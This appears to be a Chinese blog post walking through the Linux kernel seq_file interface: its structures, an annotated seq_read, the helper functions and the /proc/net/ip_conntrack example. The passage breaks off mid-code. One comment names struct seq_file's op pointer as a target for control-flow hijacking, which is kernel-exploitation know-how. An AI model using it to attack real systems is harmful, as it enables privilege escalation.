<h2 id="2-seq相关数据结构"><a href="#2-seq相关数据结构" class="headerlink" title="2.seq相关数据结构"></a>2.seq相关数据结构</h2><h3 id="2-1-seq文件结构"><a href="#2-1-seq文件结构" class="headerlink" title="2.1 seq文件结构"></a>2.1 seq文件结构</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">seq_file</span> &#123;</span></span><br><span class="line"> <span class="type">char</span> *buf;</span><br><span class="line"> <span class="type">size_t</span> size;</span><br><span class="line"> <span class="type">size_t</span> from;</span><br><span class="line"> <span class="type">size_t</span> count;</span><br><span class="line"> <span class="type">loff_t</span> index;</span><br><span class="line"> <span class="type">loff_t</span> version;</span><br><span class="line"> <span class="class"><span class="keyword">struct</span> <span class="title">mutex</span> <span class="title">lock</span>;</span></span><br><span class="line"> <span class="class"><span class="keyword">struct</span> <span class="title">seq_operations</span> *<span class="title">op</span>;</span>   <span class="comment">//主要的利用点，可以打控制流劫持</span></span><br><span class="line"> <span class="type">void</span> *private;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>


<p>struct seq_file描述了seq处理的缓冲区及处理方法，buf是动态分配的，大小不小于PAGE_SIZE，通常这个结构是通过struct file结构中的private_data来指向的。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> *buf：seq流的缓冲区</span><br><span class="line"><span class="type">size_t</span> size：缓冲区大小</span><br><span class="line"><span class="type">size_t</span> from：from指向当前要显示的数据头位置</span><br><span class="line"><span class="type">size_t</span> count：缓冲区中已有的数据长度</span><br><span class="line"><span class="type">loff_t</span> index：数据记录索引值</span><br><span class="line"><span class="type">loff_t</span> version：版本号，是<span class="class"><span class="keyword">struct</span> <span class="title">file</span>的版本号的拷贝</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">mutex</span> <span class="title">lock</span>：<span class="title">seq</span>锁</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">seq_operations</span> *<span class="title">op</span>：<span class="title">seq</span>操作结构，定义数据显示的操作函数</span></span><br><span class="line"><span class="class"><span class="title">void</span> *<span class="title">private</span>：私有数据</span></span><br></pre></td></tr></table></figure>

<h3 id="2-2-seq操作结构"><a href="#2-2-seq操作结构" class="headerlink" title="2.2 seq操作结构"></a>2.2 seq操作结构</h3><p>seq的操作结构比较简单，就是4个操作函数，完成开始、停止、显示和取下一个操作：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* include/linux/seq_file.h */</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">seq_operations</span> &#123;</span></span><br><span class="line"> <span class="type">void</span> * (*start) (<span class="keyword">struct</span> seq_file *m, <span class="type">loff_t</span> *pos);</span><br><span class="line"> <span class="type">void</span> (*stop) (<span class="keyword">struct</span> seq_file *m, <span class="type">void</span> *v);</span><br><span class="line"> <span class="type">void</span> * (*next) (<span class="keyword">struct</span> seq_file *m, <span class="type">void</span> *v, <span class="type">loff_t</span> *pos);</span><br><span class="line"> <span class="type">int</span> (*show) (<span class="keyword">struct</span> seq_file *m, <span class="type">void</span> *v);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h2 id="3-seq操作函数"><a href="#3-seq操作函数" class="headerlink" title="3.seq操作函数"></a>3.seq操作函数</h2><p>seq操作包括以下一系列函数：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">seq_open</span><span class="params">(<span class="keyword">struct</span> file *, <span class="keyword">struct</span> seq_operations *)</span>;</span><br></pre></td></tr></table></figure>

<p>打开seq流，为struct file分配struct seq_file结构，并定义seq_file的操作；</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ssize_t</span> <span class="title function_">seq_read</span><span class="params">(<span class="keyword">struct</span> file *, <span class="type">char</span> __user *, <span class="type">size_t</span>, <span class="type">loff_t</span> *)</span>;</span><br></pre></td></tr></table></figure>

<p>从seq流中读数据到用户空间，其中循环调用了struct seq_file中的各个函数来读数据；</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ssize_t</span> <span class="title function_">seq_read</span><span class="params">(<span class="keyword">struct</span> file *file, <span class="type">char</span> __user *buf, <span class="type">size_t</span> size, <span class="type">loff_t</span> *ppos)</span></span><br><span class="line">&#123;</span><br><span class="line"> <span class="class"><span class="keyword">struct</span> <span class="title">seq_file</span> *<span class="title">m</span> =</span> (<span class="keyword">struct</span> seq_file *)file-&gt;private_data;</span><br><span class="line"> <span class="type">size_t</span> copied = <span class="number">0</span>;</span><br><span class="line"> <span class="type">loff_t</span> pos;</span><br><span class="line"> <span class="type">size_t</span> n;</span><br><span class="line"> <span class="type">void</span> *p;</span><br><span class="line"> <span class="type">int</span> err = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 先加锁</span></span><br><span class="line"> mutex_lock(&amp;m-&gt;lock);</span><br><span class="line"> <span class="comment">/*</span></span><br><span class="line"><span class="comment"> \* seq_file-&gt;op-&gt;..m_start/m_stop/m_next may do special actions</span></span><br><span class="line"><span class="comment"> \* or optimisations based on the file-&gt;f_version, so we want to</span></span><br><span class="line"><span class="comment"> \* pass the file-&gt;f_version to those methods.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> \* seq_file-&gt;version is just copy of f_version, and seq_file</span></span><br><span class="line"><span class="comment"> \* methods can treat it simply as file version.</span></span><br><span class="line"><span class="comment"> \* It is copied in first and copied out after all operations.</span></span><br><span class="line"><span class="comment"> \* It is convenient to have it as part of structure to avoid the</span></span><br><span class="line"><span class="comment"> \* need of passing another argument to all the seq_file methods.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"> m-&gt;version = file-&gt;f_version;</span><br><span class="line"> <span class="comment">/* grab buffer if we didn&#x27;t have one */</span></span><br><span class="line"><span class="comment">// 如果struct seq_file结构中的缓冲区没有分配的话，</span></span><br><span class="line"><span class="comment">// 分配缓冲，大小为PAGE_SIZE</span></span><br><span class="line"> <span class="keyword">if</span> (!m-&gt;buf) &#123;</span><br><span class="line"> m-&gt;buf = kmalloc(m-&gt;size = PAGE_SIZE, GFP_KERNEL);</span><br><span class="line"> <span class="keyword">if</span> (!m-&gt;buf)</span><br><span class="line">  <span class="keyword">goto</span> Enomem;</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="comment">/* if not empty - flush it first */</span></span><br><span class="line"><span class="comment">// count表示当时有多少数据还没有传给用户空间</span></span><br><span class="line"><span class="comment">// 尽量先将这些数据传出</span></span><br><span class="line"> <span class="keyword">if</span> (m-&gt;count) &#123;</span><br><span class="line"> n = min(m-&gt;count, size);</span><br><span class="line"> err = copy_to_user(buf, m-&gt;buf + m-&gt;from, n);</span><br><span class="line"> <span class="keyword">if</span> (err)</span><br><span class="line">  <span class="keyword">goto</span> Efault;</span><br><span class="line"> m-&gt;count -= n;</span><br><span class="line"> m-&gt;from += n;</span><br><span class="line"> size -= n;</span><br><span class="line"> buf += n;</span><br><span class="line"> copied += n;</span><br><span class="line"> <span class="keyword">if</span> (!m-&gt;count)</span><br><span class="line">  m-&gt;index++;</span><br><span class="line"> <span class="keyword">if</span> (!size)</span><br><span class="line">  <span class="keyword">goto</span> Done;</span><br><span class="line"> &#125;</span><br><span class="line"><span class="comment">// 进行主要传数据过程，缓冲区中至少要有一个记录单位的数据</span></span><br><span class="line"> <span class="comment">/* we need at least one record in buffer */</span></span><br><span class="line"> <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line"><span class="comment">// 数据记录的位置</span></span><br><span class="line"> pos = m-&gt;index;</span><br><span class="line"><span class="comment">// 初始化操作，返回值为对象相关指针</span></span><br><span class="line"> p = m-&gt;op-&gt;start(m, &amp;pos);</span><br><span class="line"> err = PTR_ERR(p);</span><br><span class="line"> <span class="keyword">if</span> (!p || IS_ERR(p))</span><br><span class="line">  <span class="keyword">break</span>;</span><br><span class="line"><span class="comment">// 执行具体的显示过程</span></span><br><span class="line"> err = m-&gt;op-&gt;show(m, p);</span><br><span class="line"> <span class="keyword">if</span> (err)</span><br><span class="line">  <span class="keyword">break</span>;</span><br><span class="line"><span class="comment">// 当前缓冲区中的实际数据小于缓冲区大小，转到填数据部分</span></span><br><span class="line"> <span class="keyword">if</span> (m-&gt;count &lt; m-&gt;size)</span><br><span class="line">  <span class="keyword">goto</span> Fill;</span><br><span class="line"><span class="comment">// 否则说明一个记录的数据量太大，原来缓冲区大小不够；</span></span><br><span class="line"><span class="comment">// 先停操作，重新分配缓冲区，大小增加一倍，重新操作,</span></span><br><span class="line"><span class="comment">// 要保证缓冲区大小大于一个数据记录的大小</span></span><br><span class="line"> m-&gt;op-&gt;stop(m, p);</span><br><span class="line"> kfree(m-&gt;buf);</span><br><span class="line"> m-&gt;buf = kmalloc(m-&gt;size &lt;&lt;= <span class="number">1</span>, GFP_KERNEL);</span><br><span class="line"> <span class="keyword">if</span> (!m-&gt;buf)</span><br><span class="line">  <span class="keyword">goto</span> Enomem;</span><br><span class="line"> m-&gt;count = <span class="number">0</span>;</span><br><span class="line"> m-&gt;version = <span class="number">0</span>;</span><br><span class="line"> &#125;</span><br><span class="line"> m-&gt;op-&gt;stop(m, p);</span><br><span class="line"> m-&gt;count = <span class="number">0</span>;</span><br><span class="line"> <span class="keyword">goto</span> Done;</span><br><span class="line">Fill:</span><br><span class="line"><span class="comment">// 继续读数据到缓冲区</span></span><br><span class="line"> <span class="comment">/* they want more? let&#x27;s try to get some more */</span></span><br><span class="line"> <span class="keyword">while</span> (m-&gt;count &lt; size) &#123;</span><br><span class="line"> <span class="type">size_t</span> offs = m-&gt;count;</span><br><span class="line"> <span class="type">loff_t</span> next = pos;</span><br><span class="line"> p = m-&gt;op-&gt;next(m, p, &amp;next);</span><br><span class="line"> <span class="keyword">if</span> (!p || IS_ERR(p)) &#123;</span><br><span class="line">  err = PTR_ERR(p);</span><br><span class="line">  <span class="keyword">break</span>;</span><br><span class="line"> &#125;</span><br><span class="line"> err = m-&gt;op-&gt;show(m, p);</span><br><span class="line"> <span class="keyword">if</span> (err || m-&gt;count == m-&gt;size) &#123;</span><br><span class="line">  m-&gt;count = offs;</span><br><span class="line">  <span class="keyword">break</span>;</span><br><span class="line"> &#125;</span><br><span class="line"> pos = next;</span><br><span class="line"> &#125;</span><br><span class="line"><span class="comment">// 停seq</span></span><br><span class="line"> m-&gt;op-&gt;stop(m, p);</span><br><span class="line"> n = min(m-&gt;count, size);</span><br><span class="line"><span class="comment">// 将数据拷贝到用户空间</span></span><br><span class="line"> err = copy_to_user(buf, m-&gt;buf, n);</span><br><span class="line"> <span class="keyword">if</span> (err)</span><br><span class="line"> <span class="keyword">goto</span> Efault;</span><br><span class="line"> copied += n;</span><br><span class="line"> m-&gt;count -= n;</span><br><span class="line"> <span class="keyword">if</span> (m-&gt;count)</span><br><span class="line"> m-&gt;from = n;</span><br><span class="line"> <span class="keyword">else</span></span><br><span class="line"> pos++;</span><br><span class="line"> m-&gt;index = pos;</span><br><span class="line">Done:</span><br><span class="line"> <span class="keyword">if</span> (!copied)</span><br><span class="line"> copied = err;</span><br><span class="line"> <span class="keyword">else</span></span><br><span class="line"> *ppos += copied;</span><br><span class="line"> file-&gt;f_version = m-&gt;version;</span><br><span class="line"> mutex_unlock(&amp;m-&gt;lock);</span><br><span class="line"> <span class="keyword">return</span> copied;</span><br><span class="line">Enomem:</span><br><span class="line"> err = -ENOMEM;</span><br><span class="line"> <span class="keyword">goto</span> Done;</span><br><span class="line">Efault:</span><br><span class="line"> err = -EFAULT;</span><br><span class="line"> <span class="keyword">goto</span> Done;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">loff_t</span> <span class="title function_">seq_lseek</span><span class="params">(<span class="keyword">struct</span> file *, <span class="type">loff_t</span>, <span class="type">int</span>)</span>;</span><br></pre></td></tr></table></figure>


<p>定位seq流当前指针偏移；</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">seq_release</span><span class="params">(<span class="keyword">struct</span> inode *, <span class="keyword">struct</span> file *)</span>;</span><br></pre></td></tr></table></figure>

<p>释放seq流所分配的动态内存空间，即struct seq_file的buf及其本身；</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">seq_escape</span><span class="params">(<span class="keyword">struct</span> seq_file *, <span class="type">const</span> <span class="type">char</span> *, <span class="type">const</span> <span class="type">char</span> *)</span>;</span><br></pre></td></tr></table></figure>

<p>将seq流中需要进行转义的字符转换为8进制数字；</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">seq_putc</span><span class="params">(<span class="keyword">struct</span> seq_file *m, <span class="type">char</span> c)</span>;</span><br></pre></td></tr></table></figure>

<p>向seq流中写一个字符</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">seq_puts</span><span class="params">(<span class="keyword">struct</span> seq_file *m, <span class="type">const</span> <span class="type">char</span> *s)</span>;</span><br></pre></td></tr></table></figure>

<p>向seq流中写一个字符串</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">seq_printf</span><span class="params">(<span class="keyword">struct</span> seq_file *, <span class="type">const</span> <span class="type">char</span> *, ...)</span></span><br><span class="line"> __<span class="title function_">attribute__</span> <span class="params">((format (<span class="built_in">printf</span>,<span class="number">2</span>,<span class="number">3</span>)))</span>;</span><br></pre></td></tr></table></figure>

<p>向seq流方式写格式化信息；</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">seq_path</span><span class="params">(<span class="keyword">struct</span> seq_file *, <span class="keyword">struct</span> vfsmount *, <span class="keyword">struct</span> dentry *, <span class="type">char</span> *)</span>;</span><br></pre></td></tr></table></figure>

<p>在seq流中添加路径信息，路径字符都转换为8进制数。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">seq_release_private</span><span class="params">(<span class="keyword">struct</span> inode *, <span class="keyword">struct</span> file *)</span>;</span><br></pre></td></tr></table></figure>

<p>释放seq_file的private然后进行seq_release</p>
<h2 id="3-用seq流填写-proc文件"><a href="#3-用seq流填写-proc文件" class="headerlink" title="3.用seq流填写&#x2F;proc文件"></a>3.用seq流填写&#x2F;proc文件</h2><p>以下使用文件&#x2F;proc&#x2F;net&#x2F;ip_conntrack的生成代码来说明seq流的使用：</p>
<h3 id="3-1-创立文件"><a href="#3-1-创立文件" class="headerlink" title="3.1 创立文件"></a>3.1 创立文件</h3><p>以前2.4版本中使用proc_net_create()来建立&#x2F;proc&#x2F;net下的文件，现在使用seq流时要使用proc_net_fops_create()函数来创建，区别在于函数的最后一个参数，proc_net_create()的是一个函数指针，而proc_net_fops_create()的是一个文件操作指针：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proc = proc_net_fops_create(<span class="string">&quot;ip_conntrack&quot;</span>, <span class="number">0440</span>, &amp;ct_file_ops);</span><br></pre></td></tr></table></figure>


<p>proc_net_fops_create()函数其实也很简单，调用create_proc_entry()函数建立&#x2F;proc文件项，然后将文件项的操作结构指针指向所提供的文件操作指针：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="keyword">struct</span> proc_dir_entry *<span class="title function_">proc_net_fops_create</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *name,</span></span><br><span class="line"><span class="params"> <span class="type">mode_t</span> mode, <span class="type">const</span> <span class="keyword">struct</span> file_operations *fops)</span></span><br><span class="line">&#123;</span><br><span class="line"> <span class="class"><span class="keyword">struct</span> <span class="title">proc_dir_entry</span> *<span class="title">res</span> =</span> create_proc_entry(name, mode, proc_net);</span><br><span class="line"> <span class="keyword">if</span> (res)</span><br><span class="line"> res-&gt;proc_fops = fops;</span><br><span class="line"> <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="3-2-文件操作结构"><a href="#3-2-文件操作结构" class="headerlink" title="3.2 文件操作结构"></a>3.2 文件操作结构</h3><p>&#x2F;proc&#x2F;net&#x2F;ip_conntrack所用的文件结构如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span> <span class="title">ct_file_ops</span> =</span> &#123;</span><br><span class="line"> .owner  = THIS_MODULE,</span><br><span class="line"> .open  = ct_open,</span><br><span class="line"> .read  = seq_read,</span><br><span class="line"> .llseek = seq_lseek,</span><br><span class="line"> .release = seq_release_private,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>可见，结构中除了open()函数是需要自定义外，其他的读、定位、释放函数都可以用seq标准函数。</p>
<h3 id="3-3-open函数定义"><a href="#3-3-open函数定义" class="headerlink" title="3.3 open函数定义"></a>3.3 open函数定义</h3><p>open函数主要就是调用seq_open()函数将一个struct seq_operations结构和struct file链接起来，如果需要有私有数据的话，需要分配出动态空间作为struct seq_file的私有数据：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">ct_open</span><span class="params">(<span class="keyword">struct</span> inode *inode, <span class="keyword">struct</span> file *file)</span></span><br><span class="line">&#123;</span><br><span class="line"> <span class="class"><span class="keyword">struct</span> <span class="title">seq_file</span> *<span class="title">seq</span>;</span></span><br><span class="line"> <span class="class"><span class="keyword">struct</span> <span class="title">ct_iter_state</span> *<span class="title">st</span>;</span></span><br><span class="line"> <span class="type">int</span> ret;</span><br><span class="line"></span><br><span class="line"> st = kmalloc(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> ct_iter_state), GFP_KERNEL);</span><br><span class="line"> <span class="keyword">if</span> (st == <span class="literal">NULL</span>)</span><br><span class="line"> <span class="keyword">return</span> -ENOMEM;</span><br><span class="line"> ret = seq_open(file, &amp;ct_seq_ops);</span><br><span class="line"> <span class="keyword">if</span> (ret)</span><br><span class="line"> <span class="keyword">goto</span> out_free;</span><br><span class="line"> seq     = file-&gt;private_data;</span><br><span class="line"> seq-&gt;private = st;</span><br><span class="line"> <span class="built_in">memset</span>(st, <span class="number">0</span>, <span class="keyword">sizeof</span>(<span class="keyword">struct</span> ct_iter_state));</span><br><span class="line"> <span class="keyword">return</span> ret;</span><br><span class="line">out_free:</span><br><span class="line"> kfree(st);</span><br><span class="line"> <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>简单的如exp_open()函数，就只调用seq_open()函数就完了：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">exp_open</span><span class="params">(<span class="keyword">struct</span> inode *inode, <span class="keyword">struct</span> file *file)</span></span><br><span class="line">&#123;</span><br><span class="line"> <span class="keyword">return</span> seq_open(file, &amp;exp_seq_ops);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="3-4-seq操作结构"><a href="#3-4-seq操作结构" class="headerlink" title="3.4 seq操作结构"></a>3.4 seq操作结构</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">seq_operations</span> <span class="title">ct_seq_ops</span> =</span> &#123;</span><br><span class="line"> .start = ct_seq_start,</span><br><span class="line"> .next = ct_seq_next,</span><br><span class="line"> .stop = ct_seq_stop,</span><br><span class="line"> .show = ct_seq_show</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>这个结构就是填写4个操作函数：</p>
<p>start()函数完成读数据前的一些预先操作，通常如加锁，定位数据记录位置等，该函数返回值就是show()函数第二个参数：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> *<span class="title function_">ct_seq_start</span><span class="params">(<span class="keyword">struct</span> seq_file *seq, <span class="type">loff_t</span> *pos)</span></span><br><span class="line">&#123;</span><br><span class="line"> read_lock_bh(&amp;ip_conntrack_lock);</span><br><span class="line"> <span class="keyword">return</span> ct_get_idx(seq, *pos);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>stop()函数完成读数据后的一些恢复操作，如解锁等：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">ct_seq_stop</span><span class="params">(<span class="keyword">struct</span> seq_file *s, <span class="type">void</span> *v)</span></span><br><span class="line">&#123;</span><br><span class="line"> read_unlock_bh(&amp;ip_conntrack_lock);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<p>next()函数定位数据下一项：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> *<span class="title function_">ct_seq_next</span><span class="params">(<span class="keyword">struct</span> seq_file *s, <span class="type">void</span> *v, <span class="type">loff_t</span> *pos)</span></span><br><span class="line">&#123;</span><br><span class="line"> (*pos)++;</span><br><span class="line"> <span class="keyword">return</span> ct_get_next(s, v);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>show()函数实现读数据过程，将要输出的数据直接用seq_printf()函数打印到seq流缓冲区中，由seq_printf()函数输出到用户空间：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">ct_seq_show</span><span class="params">(<span class="keyword">struct</span> seq_file *s, <span class="type">void</span> *v)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// start()虽然返回的是struct list_head的指针，</span></span><br><span class="line"><span class="comment">// 但struct ip_conntrack_tuple_hash结构的第一</span></span><br><span class="line"><span class="comment">// 项参数就是struct list_head，所以可以进行直接</span></span><br><span class="line"><span class="comment">// 类型转换而不用再计算偏移量</span></span><br><span class="line"> <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">ip_conntrack_tuple_hash</span> *<span class="title">hash</span> =</span> v;</span><br><span class="line"> <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">ip_conntrack</span> *<span class="title">conntrack</span> =</span> tuplehash_to_ctrack(hash);</span><br><span class="line"> <span class="class"><span class="keyword">struct</span> <span class="title">ip_conntrack_protocol</span> *<span class="title">proto</span>;</span></span><br><span class="line"></span><br><span class="line"> ASSERT_READ_LOCK(&amp;ip_conntrack_lock);</span><br><span class="line"> IP_NF_ASSERT(conntrack);</span><br><span class="line"></span><br><span class="line"> <span class="comment">/* we only want to print DIR_ORIGINAL */</span></span><br><span class="line"> <span class="keyword">if</span> (DIRECTION(hash))</span><br><span class="line"> 	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"> proto = __ip_conntrack_proto_find(conntrack-&gt;tuplehash[IP_CT_DIR_ORIGINAL].tuple.dst.protonum);</span><br><span class="line"> IP_NF_ASSERT(proto);</span><br><span class="line"><span class="comment">// 以下打印连接和协议信息</span></span><br><span class="line"> <span class="keyword">if</span> (seq_printf(s, <span class="string">&quot;%-8s %u %ld &quot;</span>,</span><br><span class="line">    